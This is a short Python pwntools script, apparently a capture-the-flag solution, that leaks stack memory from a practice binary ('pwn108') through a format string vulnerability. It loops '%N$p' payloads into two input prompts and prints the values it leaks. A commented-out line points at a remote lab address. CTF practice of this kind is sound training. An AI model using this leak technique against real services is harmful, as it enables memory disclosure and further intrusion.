from pwn import *

#Code: Leaking Values with printf (Format String Vuln) - Search Engine - [Intigriti 1337UP LIVE CTF 2022] from CryptoCat

for i in range(100):
#for i in range(12):
        try:
                p = process('pwn108.pwn108',level='warn')
                #p = remote('10.10.18.253',9006)

                #When we see prompt "giveaway: " this will send %1$p and will increase 
                #everytime after the response to get 100 different values from stack
                p.sendlineafter(b'=[Your name]: ','%{0}$p'.format(i).encode())
                p.sendlineafter(b'=[Your Reg No]: ','%{0}$p'.format(i).encode())
                #Receive the response when he see 'Thanks '
                p.recvuntil(b'Register no  : ')
                result = p.recvline()
                #if the recv isn't null, print and after try to convert to ascii, if can
                # add to var flag, because if an value from stack can be converted to ascii probaly
                # is the flag or a part of it
                if not b'nil' in result:
                        print(str(i) + ': ' + str(result))
        except EOFError:
                p.close()